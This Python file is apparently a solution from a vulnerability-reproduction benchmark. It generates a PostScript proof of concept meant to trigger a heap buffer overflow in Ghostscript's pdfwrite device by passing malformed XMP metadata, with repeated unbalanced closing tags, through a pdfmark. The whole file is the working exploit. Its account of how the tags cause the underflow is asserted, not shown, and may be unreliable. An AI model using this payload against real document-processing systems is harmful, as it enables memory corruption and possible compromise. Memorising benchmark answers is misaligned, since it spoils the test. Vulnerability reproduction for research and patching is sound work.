import binascii

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in pdfwrite.
        The vulnerability occurs when pdfwrite attempts to restore the viewer state
        without checking if the viewer depth is at least 1. This can be triggered
        by providing malformed XMP metadata with unbalanced closing XML tags,
        which causes an underflow of the viewer stack index.
        """
        
        # Construct a malformed XMP metadata payload.
        # We start with valid structure to ensure parsing begins, then append
        # excessive closing tags. These closing tags will trigger the 
        # pdf_viewer_restore function (or equivalent) to pop from the viewer stack.
        # Since the stack will be empty (depth 0), this leads to a negative index access
        # or underflow, triggering the heap buffer overflow.
        
        xml_payload = b"<?xpacket begin='?' id='W5M0MpCehiHzreSzNTczkc9d'?>"
        xml_payload += b"<x:xmpmeta xmlns:x='adobe:ns:meta/'>"
        xml_payload += b"<rdf:RDF xmlns:rdf='http://www.w3.org/1999/02/22-rdf-syntax-ns#'>"
        
        # A minimal valid description to enter a state
        xml_payload += b"<rdf:Description rdf:about=''>"
        xml_payload += b"</rdf:Description>"
        
        # Close the valid tags
        xml_payload += b"</rdf:RDF>"
        xml_payload += b"</x:xmpmeta>"
        
        # THE TRIGGER:
        # Add a sequence of closing tags that have no corresponding opening tags.
        # This forces the viewer state stack to underflow.
        # We repeat them to ensure we decrement the depth counter well below zero
        # to guarantee hitting invalid memory (OOB read/write).
        xml_payload += b"</rdf:Description>" * 20
        xml_payload += b"</rdf:RDF>" * 20
        xml_payload += b"</x:xmpmeta>" * 20
        
        xml_payload += b"<?xpacket end='w'?>"
        
        # Convert the XML payload to a hex string for inclusion in PostScript
        hex_content = binascii.hexlify(xml_payload).decode('ascii')
        
        # Construct the PostScript file.
        # %!PS header identifies the file type.
        # /Metadata pdfmark passes the XMP data to the pdfwrite device.
        # showpage ensures the page is processed.
        poc = f"%!PS\n[ /Metadata <{hex_content}> /pdfmark\nshowpage\n"
        
        return poc.encode('ascii')
